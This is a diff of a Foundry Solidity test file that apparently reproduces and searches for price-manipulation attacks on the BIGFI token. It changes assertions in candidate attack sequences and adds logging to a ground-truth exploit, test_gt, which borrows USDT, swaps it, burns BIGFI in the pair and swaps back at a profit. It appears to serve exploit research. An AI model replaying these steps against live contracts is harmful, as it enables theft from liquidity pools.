@@ -222,7 +222,7 @@ contract BIGFITest is Test, BlockLoader {
         swap_pair_attacker_usdt_bigfi(amt1, amt2);
         swap_pair_attacker_bigfi_usdt(amt3, amt4);
         payback_usdt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -242,7 +242,7 @@ contract BIGFITest is Test, BlockLoader {
         swap_pair_attacker_usdt_bigfi(amt2, amt3);
         swap_pair_attacker_bigfi_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -262,7 +262,7 @@ contract BIGFITest is Test, BlockLoader {
         burn_bigfi_pair(amt3);
         swap_pair_attacker_bigfi_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -280,7 +280,7 @@ contract BIGFITest is Test, BlockLoader {
         swap_pair_attacker_bigfi_usdt(amt1, amt2);
         swap_pair_attacker_usdt_bigfi(amt3, amt4);
         payback_bigfi_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -300,7 +300,7 @@ contract BIGFITest is Test, BlockLoader {
         swap_pair_attacker_bigfi_usdt(amt2, amt3);
         swap_pair_attacker_usdt_bigfi(amt4, amt5);
         payback_bigfi_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -320,7 +320,7 @@ contract BIGFITest is Test, BlockLoader {
         burn_bigfi_pair(amt3);
         swap_pair_attacker_usdt_bigfi(amt4, amt5);
         payback_bigfi_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -344,7 +344,7 @@ contract BIGFITest is Test, BlockLoader {
         swap_pair_attacker_usdt_bigfi(amt5, amt6);
         swap_pair_attacker_bigfi_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -370,7 +370,7 @@ contract BIGFITest is Test, BlockLoader {
         swap_pair_attacker_usdt_bigfi(amt6, amt7);
         swap_pair_attacker_bigfi_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -396,7 +396,7 @@ contract BIGFITest is Test, BlockLoader {
         swap_pair_attacker_usdt_bigfi(amt6, amt7);
         swap_pair_attacker_bigfi_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -422,7 +422,7 @@ contract BIGFITest is Test, BlockLoader {
         swap_pair_attacker_usdt_bigfi(amt6, amt7);
         swap_pair_attacker_bigfi_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -448,7 +448,7 @@ contract BIGFITest is Test, BlockLoader {
         burn_bigfi_pair(amt7);
         swap_pair_attacker_bigfi_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -472,7 +472,7 @@ contract BIGFITest is Test, BlockLoader {
         swap_pair_attacker_bigfi_usdt(amt5, amt6);
         swap_pair_attacker_usdt_bigfi(amt7, amt8);
         payback_bigfi_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -498,7 +498,7 @@ contract BIGFITest is Test, BlockLoader {
         swap_pair_attacker_bigfi_usdt(amt6, amt7);
         swap_pair_attacker_usdt_bigfi(amt8, amt9);
         payback_bigfi_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -524,7 +524,7 @@ contract BIGFITest is Test, BlockLoader {
         swap_pair_attacker_bigfi_usdt(amt6, amt7);
         swap_pair_attacker_usdt_bigfi(amt8, amt9);
         payback_bigfi_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -550,7 +550,7 @@ contract BIGFITest is Test, BlockLoader {
         swap_pair_attacker_bigfi_usdt(amt6, amt7);
         swap_pair_attacker_usdt_bigfi(amt8, amt9);
         payback_bigfi_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -576,23 +576,30 @@ contract BIGFITest is Test, BlockLoader {
         burn_bigfi_pair(amt7);
         swap_pair_attacker_usdt_bigfi(amt8, amt9);
         payback_bigfi_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 200000e18);
         borrow_usdt_owner(200000e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", 200000e18);
+        emit log_named_uint("amt2", 6049.946035638727192292e18);
         swap_pair_attacker_usdt_bigfi(200000e18, 6049.946035638727192292e18);
         printBalance("After step1 ");
+        emit log_named_uint("amt3", 3260e18);
         burn_bigfi_pair(3260e18);
         printBalance("After step2 ");
+        emit log_named_uint("amt4", 6049.946035638727192292e18);
+        emit log_named_uint("amt5", 307427.442385714227894965e18);
         swap_pair_attacker_bigfi_usdt(
             6049.946035638727192292e18,
             307427.442385714227894965e18
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt6", 200600e18);
         payback_usdt_owner(200600e18);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -615,7 +622,7 @@ contract BIGFITest is Test, BlockLoader {
         burn_bigfi_pair(amt3);
         swap_pair_attacker_bigfi_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
